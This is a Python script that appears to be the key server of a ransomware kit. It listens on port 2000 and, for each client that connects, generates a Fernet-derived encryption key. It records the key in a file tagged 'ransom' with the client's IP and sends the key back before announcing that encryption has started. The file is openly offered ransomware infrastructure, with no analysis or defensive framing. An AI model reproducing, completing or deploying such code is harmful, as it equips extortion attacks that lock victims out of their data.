#!/usr/bin/python3
# This program is created by skye
# To run on unix systems only
import base64
import datetime
import socket
import subprocess
from threading import Lock, Thread

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


def generate_enc_key(passphrase, name: str = 'ransom'):
    try:
        salt = b'_dfjrf7404dxhdhcbvxzxt2423839e7wxcv(lkhdamet38i839ebncdggdee-/_'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA512(),
            length=32,
            salt=salt,
            iterations=1_000_000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))

        now = datetime.datetime.now()
        fl = f"{name}{now.strftime('%a/%b/%d/%m/%y')}"
        with open(fl, 'w') as f:
            f.write(key.decode())

        return key
    except Exception as e:
        print(f"[-] {e}")


def EchoClientHandler(clientSocket, addr):
    # while True:
    client_data = clientSocket.recv(2048)
    if client_data:
        print(f"Received from {addr}: {client_data}")
        clientSocket.send(client_data)
        password = Fernet.generate_key()
        print(f"Generated key: {password.decode()}")

        secret = generate_enc_key(password.decode(), addr[0])
        print(f"Encryption key: {secret.decode()}")

        clientSocket.send(secret)
        print(clientSocket.recv(2048))
        print("[*] Encryption started")
        clientSocket.close()
        exit()
    else:
        clientSocket.close()
        return


def main():
    ipgrep = subprocess.run(['bash', 'exec.sh'],
                            stdout=subprocess.PIPE, text=True)
    ip = ipgrep.stdout.strip()

    # Check if the IP is valid
    if not ip:
        print("[-] No IP address found. Exiting.")
        return

    try:
        socket.inet_aton(ip)  # Check if the IP address is valid
    except socket.error:
        print(f"[-] Invalid IP address: {ip}")
        return

    echoserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        echoserver.bind((ip, 2000))
        echoserver.listen(5)
        print(f"[*] Listening on {ip}:2000")

        while True:
            clientSocket, addr = echoserver.accept()
            print(f"[*] Accepted connection from {addr}")
            EchoClientHandler(clientSocket, addr)
            '''client_handler = Thread(
                target=EchoClientHandler, args=(clientSocket, addr))
            client_handler.start()'''

    except socket.gaierror as e:
        print(f"[-] Socket error: {e}")
        return


if __name__ == "__main__":
    main()
